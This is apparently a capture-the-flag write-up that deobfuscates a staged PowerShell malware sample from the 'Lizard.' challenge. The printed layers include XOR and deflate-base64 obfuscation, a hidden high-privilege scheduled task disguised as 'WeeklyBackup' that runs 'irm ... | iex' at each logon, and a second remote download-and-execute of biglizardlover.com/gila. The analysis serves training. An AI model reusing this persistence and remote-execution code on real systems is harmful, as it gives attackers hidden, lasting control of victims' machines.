<h1 id="-lizard">üêû Lizard.</h1>
<p>|Category         |	Author                |
|‚Äî‚Äî‚Äî‚Äî‚Äî‚Äì|‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äì|
|üêû Malware       |Adam Rice         |</p>

<h2 id="challenge-prompt">Challenge Prompt</h2>

<p>Erm, what the sigma?</p>

<p>We saw this strange PowerShell string on one of our hosts, can you investigate and figure out what this does?</p>

<p><code class="language-plaintext highlighter-rouge">irm biglizardlover.com/gecko | iex</code></p>

<p><img src="https://media1.tenor.com/m/7p2_VKPSdBYAAAAC/lizard-lizard-lizard-button.gif" alt="Lizard." /></p>

<blockquote>
  <p>[!CAUTION]
This is the <code class="language-plaintext highlighter-rouge">Malware</code> category, and as such, includes malware.
Please be sure to analyze these files within an isolated virtual machine.</p>
</blockquote>

<h2 id="problem-type">Problem Type</h2>
<ul>
  <li>Cryptocurrency Malware</li>
</ul>

<h2 id="password">Password</h2>
<blockquote>
  <p>[!NOTE]
The password to the archive is <code class="language-plaintext highlighter-rouge">infected</code>.</p>
</blockquote>

<h2 id="solve">Solve</h2>
<p>Ran the command in the prompt leaving off the <code class="language-plaintext highlighter-rouge">iex</code> part which would execute the command.</p>

<p>That returned:</p>
<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">.</span><span class="p">(</span><span class="w"> </span><span class="p">([</span><span class="n">sTriNg</span><span class="p">]</span><span class="nv">$vERBOsEpREfEREnCe</span><span class="p">)[</span><span class="mi">1</span><span class="p">,</span><span class="mi">3</span><span class="p">]</span><span class="o">+</span><span class="s1">'X'</span><span class="o">-JoiN</span><span class="s1">''</span><span class="p">)</span><span class="w"> </span><span class="p">(</span><span class="w"> </span><span class="p">(</span><span class="w"> </span><span class="s1">'12G10G4}12I8b73G98G122&amp;22&amp;111f99f65f95G92,73f79,119,24&amp;0y30z26f0,30&amp;25,113y1z70G99I101I98b11z11&amp;5,12f4&amp;98G73z91}1z99f78z70y73}111y120y12r12}69f67I2I79&amp;99&amp;97,92G94G105z95}127,101z67r66b2,104}105r74I64f109z120y73f127b88I94y73}109G97y4I12}119&amp;69,67}2z65f105r65y67r126y85y127G120,94I105r77I65y113f119b111b99,66z122f105r94,88r113y22r22,106r94b67&amp;65z78I109&amp;95&amp;105f26y24}127z88f126&amp;101&amp;66G107G4y11b72&amp;122&amp;122,78}120b7b98y107&amp;106I100I27,66z122&amp;24&amp;85z69z64f121r24&amp;95z84z88r66,117z105}106}103&amp;111r73&amp;97b69&amp;107z78r101z64y103&amp;101f105G29}75f93f118I92G107b91}88G75b66,118I92}94I84&amp;30f110f30z124&amp;125y27,103y89y3r31,88z29,84&amp;89z117I65G28G126y72}94z96r89&amp;74&amp;30r66r74G65r7I24f91f121f77,72b30z101b91,65G73}71f28G125b30}31b30G94,98,29r89&amp;88&amp;20r92f73z122y116z92b122b73b122,85I122I31I77}67G20}93}71&amp;93&amp;3G77y70r106f31f86}121r109&amp;85y24&amp;103f111b109}75z91r125}99r95I28I111r68G31}124z120f100I105}30r122z125I93z20f111}101r122r109}116I109r91z73&amp;75r121I99&amp;106,86}7&amp;98,94z67,78y78z124r94I70f121f125I93I99z91I21G86G25b99f102z124y104&amp;79y97I84}75b28}84}20G104&amp;116y24}77&amp;116b75&amp;122G26f72f7I75z25z86y94r24z97G105z123,78&amp;88f106&amp;30f78r92f122r69z31&amp;103&amp;79}109I66&amp;3&amp;72z30b26f125G21r24G102}110}27r66&amp;67}31G86}101f25r111r106,88&amp;74}72y88G77b122y25,70r67r69b124b75I28&amp;109y105y99I122,7r102y66r109&amp;97f24,118I123I31b85z103f93&amp;66}117y26y93I68b92G24b74,117I90&amp;91I84,97G77f109r105G116G109z75&amp;125y106y98y78,124}100y111z24r107I28G91r21b100}86z70I121f20r101G104&amp;104f103f106y122z107y92z25,96I98&amp;85I98}103r69G92f127,25G24G124f68y116&amp;107}116r101G28f86r107,117G86y107r27,73z116&amp;67}79b93f68&amp;116,3I74r25G68b90z120f75z7,78z126b77b21I94f95I124,94G29f74I3y75I124}89z93&amp;72I105&amp;64}109y74,31,95I124&amp;95z121f89b20z102f102,64I64z79f109z125}79G72I105y121}85I96G20f65}109,117b126r73&amp;27y88r124y71b97z107b126f127f25I121&amp;86&amp;110}78,27r31z107&amp;110G85r21}66,27G120G65,126z74f103,69b109b125y27f106}71&amp;123f77r96f122,110I90,126r117r70z25z123y122G117f20b127y68}107,85r121}109I118G25z86&amp;89f78y64r20r71r96y103G127&amp;118I103G64G30&amp;94I126f78b126y117I27r26b85f99,21,105G121,94f78&amp;24r109b95f29z122f71I102I89I84r29r93f71f7r98b27,92G109b118&amp;21}122&amp;24G25G69,117b91f101,65f127}24b67b7I26f91f69r120y101z86f67y21,71,111&amp;122}120G120r106f124}109y21r69b90I110y121y102G92f67f122f92z98&amp;86}72f124y21I85&amp;94I69&amp;125f68y71z30r86y123,124f73b66}104,31I124b109r68I28z71f124I104f73I77r111&amp;92G78,29}70y65r86b123f84}116r79r118}84y96y64&amp;72}106&amp;28}28z75&amp;66r68f78&amp;65y102z117b31b97z67I89z79,25z25y67b121f28,86&amp;64r71r106z27&amp;101G91G88G25}26r90,110z24}102r124}71}127&amp;26y106y97G118G90f127&amp;93z89f29b89I90&amp;29f30z90r73b31z116&amp;64G104b90&amp;93y85f104,94,109}77,104,124I29I107,66G100y27}68b65y77G120r29I126&amp;110z68G86,89y20y29f26y31f30y7r122z96f70r73G90f122}77r25z70z77}84z116r100f117&amp;90}7,85f65b97y99b25&amp;29y101,73r116I110}100}107r99G126I107r21y120,89&amp;101z66,86}111z93I102,109&amp;117y31}125b78r25,68z94,66&amp;28y74r116,64y71b31f25I96z89&amp;70b72y96}90G31G68z28f85b117I64G99b24z103b79G104}68f101z124I74&amp;74f75b97I97f21I109,75,74r79&amp;105G109b20r89}97I109G7f29I85y101f68r95&amp;25}100I126r77r64G72,25&amp;102,122G116z93f29r98}104,28,127y75,106y7r122y90,29&amp;127b64,126}21r89r77I29}31r120y117G73b20b66y116z102G31G93z3&amp;93I90G72b102y92}99z93y72f74z64z64&amp;110z66b31z98r107r79&amp;95I30G110r125}24r105&amp;77G100}85z65b31,7z101,72z71I78,104&amp;109}31b102z124y79G29f30G120G25b127G127r79I104&amp;68b78y91r86,102&amp;89I71b68&amp;125z94,28r66f95G68z85r85I28f97r72,71z68z91G117r69f31G75}127}85G67}27G65y106f117,64I31z85I98&amp;86&amp;84}3y27y28f64f85z24f24b84&amp;30r107z68z116I64&amp;120y125,106b97&amp;70f124&amp;111,106,64f85,21z102}66}29f106I127}127G27,99}109r99y78I121,109y72y106I91f71G93y121z7I89b117z71y102r7I20}111y94b66}116f24I103G21b78,24r124f123r88&amp;118b105f27&amp;94f90b90&amp;69f30I110}28r31r104r93G104,123G98y30,94z89I122&amp;66&amp;123b125,126z117y121,20r111G106r72f107}99I103y92I90}126&amp;109r127b95r92I88&amp;77,111&amp;123}109y101I72z117G69f92&amp;7z110I70}93r127y21,67f120&amp;26I121G116G69,122r28,109I68r91f95b111G89,111,91r126z72f28I102f28,7r126f94&amp;70z99,107,107z94}97r70I86G73f123,100z30b71}70b93b123f71}79&amp;104G79b73r86r67G96G21,7b86}78I66&amp;89r25,84f122G31I67G122&amp;68}78b95,121y121&amp;117b127z103z89r77,97z28r95r73z124z88z7}31y102y105}71z21,100}86z70r30y64b123z110&amp;100I92z29}72}105f86y100b88I29z94z105&amp;97f73y92f124G7,90,64b85y24I91,27G98}122&amp;126}94b74I103y101I73b25f97r85b29}121I103,96G102z109I74G65f96&amp;7r72r89y74y73r25b77}75G66f105,123b88G21y125z78}121G72G31G111G31G107G20G24I89b78&amp;26I116z110b85}3b72f74&amp;94z3b66r67,24}100}78f73G117I73y25I116&amp;107&amp;93f78&amp;102z120}92&amp;66&amp;24&amp;94r3f86&amp;97b123I97G91b68b111r101r27z77&amp;105,122,84G99z126&amp;127b121y98r105z107z102r94,20I68f78G94f111}96y79I67y31r79I7y92f3b78&amp;88b25G98y73,74I101I116f20y126&amp;98b25f116,24y96,86G121z122y25f111r102,24}29b66&amp;86}7y117z7,95,95G21r24I116&amp;105G72&amp;102&amp;105,84&amp;89r64b3,68f107}24}77z31I75I121b95&amp;73y123I30&amp;121y25&amp;98,122z72y20}102}31G21I29I117&amp;111&amp;116&amp;30}98b110z110z109y90G109y7b118r69&amp;7&amp;74y89f107,88y74r120f84y78y75f97r104y72z91b118z72f85z72,103,124}85&amp;68z27f95G92&amp;86I88r79I124r91&amp;24y74I106y91}7&amp;116I71G126f64y116&amp;95z90I102z107}28}21&amp;28b96z111r94r69,31,89,89r110r66r70&amp;88,20y104&amp;110&amp;85I90f75,124y71&amp;90z77b90y29I101}70b118&amp;27f7&amp;74}66I72,102I103r126b122I103r118,70f27r7f125}89b97z120G79&amp;3b91G104I66&amp;24}104z91z17z17I11G5,12r0z119z95z85r127b120&amp;73&amp;97G2r101}67f2}79b99}65b124}94G105&amp;127G127,69G67&amp;66f2z79y67y97r124z94}73G95I127z69&amp;67z98z65,67,104z105b113,22z22I72b105b111,99G65}92b94y73z95}127r12&amp;5b12,80z106z67y94&amp;105f109f111}68b1G99I110z102f73r111f120z12&amp;87&amp;12&amp;98G73G91z1,99f78,70I73}111y120y12G12f101f67&amp;2I95b120&amp;94r73y77r65z94,105b77&amp;72r105r126&amp;4r12z8I115z0b119,120}105z84,88G2}105z66f79,67,72f101r66}75,113r22f22z109z95}79r69z69}5y12f81b80b106b67&amp;94z105}77,111I100y1b99,78I102f73z111z88f12&amp;87&amp;12G8r115,2y126f105b109b104G120,67&amp;73I98}72,4G5}81I12,5}12'</span><span class="o">-SPlIT</span><span class="w"> </span><span class="s1">'g'</span><span class="w"> </span><span class="o">-spLiT</span><span class="s1">'R'</span><span class="o">-sPLiT</span><span class="w"> </span><span class="s1">'&amp;'</span><span class="o">-SplIt</span><span class="w"> </span><span class="s1">','</span><span class="o">-sPlIt</span><span class="w"> </span><span class="s1">'Y'</span><span class="o">-SplIT</span><span class="w"> </span><span class="s1">'z'</span><span class="o">-SPLIT</span><span class="w"> </span><span class="s1">'}'</span><span class="w"> </span><span class="o">-sPlIT</span><span class="w"> </span><span class="s1">'i'</span><span class="o">-SpliT</span><span class="w"> </span><span class="s1">'F'</span><span class="w"> </span><span class="o">-SPLit</span><span class="s1">'b'</span><span class="o">|%</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="p">[</span><span class="n">CHar</span><span class="p">](</span><span class="w"> </span><span class="bp">$_</span><span class="w"> </span><span class="o">-bxoR</span><span class="w">  </span><span class="mi">0</span><span class="n">x2c</span><span class="w">  </span><span class="p">)</span><span class="w"> </span><span class="p">}</span><span class="w"> </span><span class="p">)</span><span class="o">-jOIN</span><span class="s1">''</span><span class="p">)</span><span class="w">
</span></code></pre></div></div>

<p>Ran that adding</p>
<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Write-Output</span><span class="w">
</span></code></pre></div></div>
<p>to the front of the command:</p>

<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">ieX</span><span class="w">
 </span><span class="o">&amp;</span><span class="p">(</span><span class="w"> </span><span class="nv">$</span><span class="nn">eNV</span><span class="p">:</span><span class="nv">COmspec</span><span class="p">[</span><span class="mi">4</span><span class="p">,</span><span class="mi">26</span><span class="p">,</span><span class="mi">25</span><span class="p">]</span><span class="o">-jOIN</span><span class="s1">''</span><span class="p">)</span><span class="w"> </span><span class="p">(</span><span class="n">New-ObjeCT</span><span class="w">  </span><span class="nx">io.cOMprEsSIon.DEflATeStreAM</span><span class="p">(</span><span class="w"> </span><span class="p">[</span><span class="n">io.mEmoRySTrEam</span><span class="p">][</span><span class="n">COnVErt</span><span class="p">]::</span><span class="n">FrombAsE64StRInG</span><span class="p">(</span><span class="s1">'dVVbT+NGFH7nV4yilU4sxtnYEFKCeMiGbIlKIE1gqZpGwtgnZprx2B2PQ7Ku/3t1xuYm0RdrLuf2nfm+4wUad2Iwmek0Q232rN1ut8peVXpVeVyV3ao8qkq/ajF3zUAy4KCAgwQOs0Ch3PTHE2VQq8CIVAXAwegUOFz+NrobbPrjUQqOw9z5OJPDcMxg0x8DX4aXgV6d+g5zr4MEWbtF2bpVi3KcAn/d26Q94JB7no3zI5CFtfdtaV5joiPg0AEOV+JnAM4ZW3yKqnY6qhp4fYvwxMaAEXAgQFNbPHC4G0w9HzjU8IDDKFVGp5LNyNKipS54PhXGXI0zGYzG7eXocqhX/f5hvTg+bRa9rsPr1f/gPuqdElAf3sPsUu8JJllcAQcdEUyL8mAYRe7tPkMGRS5UzBb73GBy9n7TmRfKiAQ7FkWaLVBvRYj5WVY8ShGyUAZ5zubl8kLKSZKl2rRbRY76yO9EUrb4As1VkJux1qk+N7pAZ9V45iYwImS4o+6wiTIzo9kCVTTFPA9ivBUJpoVpNzdP9yriQhk2zWPenD3PAh0kPDeaCpb1jmzWxXcZxLldF00gnhbmJY3Mouc55oU0zlkF7Iwt56vB4JPkS6FMZvSqu1uv12ve3XlDvqyDrAaDP1GnH7hmaT1RBhzu81632+VLjevVa5jaxXHYv+ymMO51IeXBHGORG9TuInzCqJAY3Qb5hrn0fXlk35LujdLv3h0yYlO4KcDhIPffgMM9AgfcEA8uMA+1yIhs5HRald5JVXq1ND0SgF+Vv1SlR9ua13TYe8nXJ3q/qvdJpOqdfllBn3NGcs2BQ4EaHym3+IdkbDA3JPc12T5SScDhbwzJukhQr0nshyy0MdkhwYi3gSyo7mFYl3yNzx/70ly44x2GhXlTQFMjPCFly9Jn1FSS7OAObUAdFwkqU+uYkJ+8CrnX4K9b4PWtZE7rvvi2B03DqDWN2ruVnWQRYU8CFdGOKpvRASsptaCWAIdYip+BjqS9oT6UXiV0AhwsCuCwRd0J0+RrjOGGrMjzeWH2kjqWkcDcezoL9+zbnu5xV3oVhbsUUYSKuaM0sePt+3JEk9Hzj2lWBHp1dEzHt1rEMepP+vly4w7NVRrfKIe5My1UKLJAfmL+dufe5agnEWt9QbUd3C3G84ub6XBy/dfr/no4HbeYe5XGqbJTpn4r/zMWMwhCI7aEVxORSUNEGJr8hbrCLco3c+p/bt5NefIX8RN5X4LzUV5CJ41nz+Y+ss94XEdJExul/hG4a3gUseW2U5NVd8J391YCX2NBBAvA+Zi+fuGtfTxbgMDdwZdydKPyh7spztcPw4fFw+XkRlXsvJG090LCri3uuBnjt8DByvgPkvav1IjZ7+fndJKRVKZj7+QuMTc/wDn4Dw=='</span><span class="p">)</span><span class="w"> </span><span class="p">,[</span><span class="n">sySTeM.Io.cOmPrESSion.coMPresSioNmoDE</span><span class="p">]::</span><span class="n">dECOmpresS</span><span class="w"> </span><span class="p">)</span><span class="w"> </span><span class="o">|</span><span class="n">ForEACh-OBJeCT</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="n">New-ObjeCT</span><span class="w">  </span><span class="nx">Io.sTreamrEadER</span><span class="p">(</span><span class="w"> </span><span class="bp">$_</span><span class="p">,[</span><span class="n">TExt.EncodIng</span><span class="p">]::</span><span class="n">Ascii</span><span class="p">)</span><span class="w"> </span><span class="p">}</span><span class="o">|</span><span class="n">ForEaCH-ObJeCt</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="bp">$_</span><span class="o">.</span><span class="nf">READToeNd</span><span class="p">()}</span><span class="w"> </span><span class="p">)</span><span class="w">
</span></code></pre></div></div>

<p>Ran that removing <code class="language-plaintext highlighter-rouge">iex</code> and <code class="language-plaintext highlighter-rouge">&amp;&amp;( $eNV:COmspec[4,26,25]-jOIN'')</code>:</p>

<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Set-ItemProperty</span><span class="w"> </span><span class="p">(((</span><span class="s2">"{5}{1}{4}{0}{3}{2}"</span><span class="w"> </span><span class="nt">-f</span><span class="w"> </span><span class="s1">'l '</span><span class="p">,</span><span class="s1">'n'</span><span class="p">,</span><span class="s1">'l'</span><span class="p">,</span><span class="s1">'Panelk7EInternationa'</span><span class="p">,</span><span class="s1">'tro'</span><span class="p">,</span><span class="s1">'HKCU:k7ECo'</span><span class="p">))</span><span class="w"> </span><span class="o">-REplAcE</span><span class="w"> </span><span class="s1">'k7E'</span><span class="p">,[</span><span class="n">cHar</span><span class="p">]</span><span class="mi">92</span><span class="p">)</span><span class="w"> </span><span class="nt">-Name</span><span class="w"> </span><span class="p">(</span><span class="s2">"{1}{0}"</span><span class="nt">-f</span><span class="w"> </span><span class="s1">'9'</span><span class="p">,(</span><span class="s2">"{1}{0}"</span><span class="w"> </span><span class="nt">-f</span><span class="w"> </span><span class="s1">'5'</span><span class="p">,</span><span class="s1">'s11'</span><span class="p">))</span><span class="w"> </span><span class="nt">-Value</span><span class="w"> </span><span class="p">(</span><span class="s2">"{2}{0}{1}"</span><span class="w"> </span><span class="nt">-f</span><span class="w"> </span><span class="s1">'rd'</span><span class="p">,</span><span class="s1">'.'</span><span class="p">,</span><span class="s1">'Liza'</span><span class="p">);</span><span class="w"> </span><span class="n">Set-ItemProperty</span><span class="w"> </span><span class="p">(((</span><span class="s2">"{2}{0}{3}{5}{1}{7}{4}{6}"</span><span class="w"> </span><span class="nt">-f</span><span class="s1">'C'</span><span class="p">,</span><span class="s1">'anelM'</span><span class="p">,</span><span class="s1">'HK'</span><span class="p">,</span><span class="s1">'U:M12'</span><span class="p">,</span><span class="s1">'Intern'</span><span class="p">,</span><span class="s1">'Control P'</span><span class="p">,</span><span class="s1">'ational'</span><span class="p">,</span><span class="s1">'12'</span><span class="p">))</span><span class="w">  </span><span class="o">-rePlaCE</span><span class="p">([</span><span class="n">CHAr</span><span class="p">]</span><span class="mi">77</span><span class="o">+</span><span class="p">[</span><span class="n">CHAr</span><span class="p">]</span><span class="mi">49</span><span class="o">+</span><span class="p">[</span><span class="n">CHAr</span><span class="p">]</span><span class="mi">50</span><span class="p">),[</span><span class="n">CHAr</span><span class="p">]</span><span class="mi">92</span><span class="p">)</span><span class="w"> </span><span class="nt">-Name</span><span class="w"> </span><span class="p">(</span><span class="s2">"{1}{0}"</span><span class="nt">-f</span><span class="w"> </span><span class="s1">'359'</span><span class="p">,</span><span class="s1">'s2'</span><span class="p">)</span><span class="w"> </span><span class="nt">-Value</span><span class="w"> </span><span class="p">(</span><span class="s2">"{0}{2}{1}"</span><span class="nt">-f</span><span class="w"> </span><span class="s1">'L'</span><span class="p">,</span><span class="s1">'rd.'</span><span class="p">,</span><span class="s1">'iza'</span><span class="p">)</span><span class="w">
</span><span class="n">Add-Type</span><span class="w"> </span><span class="s1">'using System;using System.Runtime.InteropServices;public class R{[DllImport("user32.dll",SetLastError=true)]public static extern IntPtr SendMessageTimeout(IntPtr hWnd,int Msg,IntPtr wParam,string lParam,int fuFlags,int uTimeout,out IntPtr lpdwResult);}'</span><span class="w"> </span><span class="p">;</span><span class="w"> </span><span class="p">[</span><span class="n">R</span><span class="p">]::</span><span class="n">SendMessageTimeout</span><span class="p">([</span><span class="n">intptr</span><span class="p">]</span><span class="mi">0</span><span class="n">xffff</span><span class="p">,</span><span class="mi">0</span><span class="n">x1A</span><span class="p">,[</span><span class="n">IntPtr</span><span class="p">]::</span><span class="n">Zero</span><span class="p">,(</span><span class="s2">"{1}{0}"</span><span class="w"> </span><span class="nt">-f</span><span class="s1">'l'</span><span class="p">,</span><span class="s1">'Int'</span><span class="p">),</span><span class="mi">2</span><span class="p">,</span><span class="mi">5000</span><span class="p">,[</span><span class="n">ref</span><span class="p">]([</span><span class="n">intptr</span><span class="p">]::</span><span class="n">Zero</span><span class="p">))</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Out</span><span class="nt">-Null</span><span class="w">
</span><span class="n">Register</span><span class="nt">-ScheduledTask</span><span class="w"> </span><span class="nt">-TaskName</span><span class="w"> </span><span class="p">(</span><span class="s2">"{2}{3}{1}{0}"</span><span class="w"> </span><span class="nt">-f</span><span class="w"> </span><span class="p">(</span><span class="s2">"{1}{0}"</span><span class="nt">-f</span><span class="s1">'p'</span><span class="p">,</span><span class="s1">'acku'</span><span class="p">),</span><span class="s1">'lyB'</span><span class="p">,</span><span class="s1">'We'</span><span class="p">,</span><span class="s1">'ek'</span><span class="p">)</span><span class="w"> </span><span class="nt">-Description</span><span class="w"> </span><span class="p">(</span><span class="s2">"{9}{16}{11}{4}{10}{12}{8}{14}{13}{5}{0}{15}{3}{1}{7}{6}{2}"</span><span class="w"> </span><span class="nt">-f</span><span class="w"> </span><span class="s1">'hion'</span><span class="p">,</span><span class="s1">'n'</span><span class="p">,</span><span class="s1">'l'</span><span class="p">,</span><span class="s1">' u'</span><span class="p">,</span><span class="s1">' = o'</span><span class="p">,</span><span class="s1">'s'</span><span class="p">,</span><span class="s1">'uerebe'</span><span class="p">,</span><span class="s1">'iq'</span><span class="p">,</span><span class="s1">'ttest '</span><span class="p">,</span><span class="s1">'fl'</span><span class="p">,</span><span class="s1">'b'</span><span class="p">,</span><span class="s1">'e'</span><span class="p">,</span><span class="s1">'jec'</span><span class="p">,</span><span class="s1">'sumerfa'</span><span class="p">,</span><span class="s1">'+ con'</span><span class="p">,</span><span class="s1">' +'</span><span class="p">,</span><span class="s1">'agvalu'</span><span class="p">)</span><span class="w"> </span><span class="nt">-Action</span><span class="w"> </span><span class="p">(</span><span class="n">New</span><span class="nt">-ScheduledTaskAction</span><span class="w"> </span><span class="nt">-Execute</span><span class="w"> </span><span class="p">(</span><span class="s2">"{1}{0}{2}"</span><span class="w"> </span><span class="nt">-f</span><span class="s1">'hel'</span><span class="p">,</span><span class="s1">'powers'</span><span class="p">,</span><span class="s1">'l.exe'</span><span class="p">)</span><span class="w"> </span><span class="nt">-Argument</span><span class="w"> </span><span class="p">(((</span><span class="s2">"{10}{6}{3}{5}{15}{14}{1}{13}{17}{2}{9}{8}{12}{7}{11}{4}{0}{16}"</span><span class="w"> </span><span class="nt">-f</span><span class="s1">'0} '</span><span class="p">,</span><span class="s1">'ndo'</span><span class="p">,</span><span class="s1">'mand '</span><span class="p">,</span><span class="s1">'tionPo'</span><span class="p">,</span><span class="s1">' {'</span><span class="p">,</span><span class="s1">'li'</span><span class="p">,</span><span class="s1">'u'</span><span class="p">,</span><span class="s1">'glizardlo'</span><span class="p">,</span><span class="s1">' b'</span><span class="p">,</span><span class="s1">'{1}irm'</span><span class="p">,</span><span class="s1">'-Exec'</span><span class="p">,</span><span class="s1">'ver.com/gecko'</span><span class="p">,</span><span class="s1">'i'</span><span class="p">,</span><span class="s1">'wStyle'</span><span class="p">,</span><span class="s1">'pass -Wi'</span><span class="p">,</span><span class="s1">'cy By'</span><span class="p">,</span><span class="s1">'iex{1}'</span><span class="p">,</span><span class="s1">' Hidden -Com'</span><span class="p">))</span><span class="w"> </span><span class="nt">-F</span><span class="p">[</span><span class="n">CHar</span><span class="p">]</span><span class="mi">124</span><span class="p">,[</span><span class="n">CHar</span><span class="p">]</span><span class="mi">34</span><span class="p">))</span><span class="w"> </span><span class="nt">-Trigger</span><span class="w"> </span><span class="p">(</span><span class="n">New</span><span class="nt">-ScheduledTaskTrigger</span><span class="w"> </span><span class="nt">-AtLogOn</span><span class="p">)</span><span class="w"> </span><span class="nt">-Principal</span><span class="w"> </span><span class="p">(</span><span class="n">New</span><span class="nt">-ScheduledTaskPrincipal</span><span class="w"> </span><span class="nt">-UserId</span><span class="w"> </span><span class="s2">"</span><span class="nv">$</span><span class="nn">env</span><span class="p">:</span><span class="nv">USERDOMAIN</span><span class="s2">\</span><span class="nv">$</span><span class="nn">env</span><span class="p">:</span><span class="nv">USERNAME</span><span class="s2">"</span><span class="w"> </span><span class="nt">-LogonType</span><span class="w"> </span><span class="p">(</span><span class="s2">"{1}{2}{0}"</span><span class="w"> </span><span class="nt">-f</span><span class="w"> </span><span class="p">(</span><span class="s2">"{1}{0}"</span><span class="nt">-f</span><span class="w"> </span><span class="s1">'active'</span><span class="p">,</span><span class="s1">'r'</span><span class="p">),</span><span class="s1">'Int'</span><span class="p">,</span><span class="s1">'e'</span><span class="p">)</span><span class="w"> </span><span class="nt">-RunLevel</span><span class="w"> </span><span class="p">(</span><span class="s2">"{1}{0}"</span><span class="w"> </span><span class="nt">-f</span><span class="s1">'st'</span><span class="p">,(</span><span class="s2">"{1}{0}"</span><span class="nt">-f</span><span class="w"> </span><span class="s1">'ighe'</span><span class="p">,</span><span class="s1">'H'</span><span class="p">)))</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Out</span><span class="nt">-Null</span><span class="w">
</span><span class="n">irm</span><span class="w"> </span><span class="p">(</span><span class="s2">"{1}{5}{2}{3}{0}{4}"</span><span class="w"> </span><span class="nt">-f</span><span class="s1">'om'</span><span class="p">,(</span><span class="s2">"{0}{1}"</span><span class="nt">-f</span><span class="s1">'big'</span><span class="p">,</span><span class="s1">'l'</span><span class="p">),</span><span class="s1">'e'</span><span class="p">,</span><span class="s1">'r.c'</span><span class="p">,(</span><span class="s2">"{0}{1}"</span><span class="w"> </span><span class="nt">-f</span><span class="w"> </span><span class="s1">'/gil'</span><span class="p">,</span><span class="s1">'a'</span><span class="p">),(</span><span class="s2">"{1}{0}"</span><span class="nt">-f</span><span class="w"> </span><span class="s1">'zardlov'</span><span class="p">,</span><span class="s1">'i'</span><span class="p">))</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">iex</span><span class="w">
</span><span class="nv">${COns`UMeRf`A`S`HIOn}</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="s2">"{2}{1}{6}{3}{0}{5}{4}"</span><span class="nt">-f</span><span class="w"> </span><span class="s1">'3T'</span><span class="p">,</span><span class="s1">'B'</span><span class="p">,</span><span class="s1">'WXp'</span><span class="p">,</span><span class="s1">'Gt'</span><span class="p">,</span><span class="s1">'PQ=='</span><span class="p">,</span><span class="s1">'Wpn'</span><span class="p">,</span><span class="s1">'ME16UmtOV'</span><span class="p">)</span><span class="w">
</span></code></pre></div></div>

<p>Decoded that:</p>
<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Set-ItemProperty</span><span class="w"> </span><span class="s1">'HKCU:\Control Panel\International'</span><span class="w"> </span><span class="nt">-Name</span><span class="w"> </span><span class="s1">'s1159'</span><span class="w"> </span><span class="nt">-Value</span><span class="w"> </span><span class="s1">'Lizard.'</span><span class="p">;</span><span class="w"> </span><span class="n">Set-ItemProperty</span><span class="w"> </span><span class="s1">'HKCU:\Control Panel\International'</span><span class="w"> </span><span class="nt">-Name</span><span class="w"> </span><span class="s1">'s2359'</span><span class="w"> </span><span class="nt">-Value</span><span class="w"> </span><span class="s1">'Lizard.'</span><span class="w">
</span><span class="n">Add-Type</span><span class="w"> </span><span class="s1">'using System;using System.Runtime.InteropServices;public class R{[DllImport("user32.dll",SetLastError=true)]public static extern IntPtr SendMessageTimeout(IntPtr hWnd,int Msg,IntPtr wParam,string lParam,int fuFlags,int uTimeout,out IntPtr lpdwResult);}'</span><span class="w"> </span><span class="p">;</span><span class="w"> </span><span class="p">[</span><span class="n">R</span><span class="p">]::</span><span class="n">SendMessageTimeout</span><span class="p">([</span><span class="n">intptr</span><span class="p">]</span><span class="mi">0</span><span class="n">xffff</span><span class="p">,</span><span class="mi">0</span><span class="n">x1A</span><span class="p">,[</span><span class="n">IntPtr</span><span class="p">]::</span><span class="n">Zero</span><span class="p">,(</span><span class="s2">"{1}{0}"</span><span class="w"> </span><span class="nt">-f</span><span class="s1">'l'</span><span class="p">,</span><span class="s1">'Int'</span><span class="p">),</span><span class="mi">2</span><span class="p">,</span><span class="mi">5000</span><span class="p">,[</span><span class="n">ref</span><span class="p">]([</span><span class="n">intptr</span><span class="p">]::</span><span class="n">Zero</span><span class="p">))</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Out</span><span class="nt">-Null</span><span class="w">
</span><span class="n">Register</span><span class="nt">-ScheduledTask</span><span class="w"> </span><span class="nt">-TaskName</span><span class="w"> </span><span class="s1">'WeeklyBackup'</span><span class="w"> </span><span class="nt">-Description</span><span class="w"> </span><span class="s1">'flagvalue = objecttest + consumerfashion + uniquerebel'</span><span class="w"> </span><span class="nt">-Action</span><span class="w"> </span><span class="p">(</span><span class="n">New</span><span class="nt">-ScheduledTaskAction</span><span class="w"> </span><span class="nt">-Execute</span><span class="w"> </span><span class="s1">'powershell.exe'</span><span class="w"> </span><span class="nt">-Argument</span><span class="w"> </span><span class="s1">'-ExecutionPolicy Bypass -WindowStyle Hidden -Command "irm biglizardlover.com/gecko | iex"'</span><span class="w"> </span><span class="nt">-Trigger</span><span class="w"> </span><span class="p">(</span><span class="n">New</span><span class="nt">-ScheduledTaskTrigger</span><span class="w"> </span><span class="nt">-AtLogOn</span><span class="p">)</span><span class="w"> </span><span class="nt">-Principal</span><span class="w"> </span><span class="p">(</span><span class="n">New</span><span class="nt">-ScheduledTaskPrincipal</span><span class="w"> </span><span class="nt">-UserId</span><span class="w"> </span><span class="s2">"</span><span class="nv">$</span><span class="nn">env</span><span class="p">:</span><span class="nv">USERDOMAIN</span><span class="s2">\</span><span class="nv">$</span><span class="nn">env</span><span class="p">:</span><span class="nv">USERNAME</span><span class="s2">"</span><span class="w"> </span><span class="nt">-LogonType</span><span class="w"> </span><span class="s1">'Interactive'</span><span class="w"> </span><span class="nt">-RunLevel</span><span class="w"> </span><span class="s1">'Highest'</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Out</span><span class="nt">-Null</span><span class="w">
</span><span class="n">irm</span><span class="w"> </span><span class="s1">'biglizardlover.com/gila'</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">iex</span><span class="w">
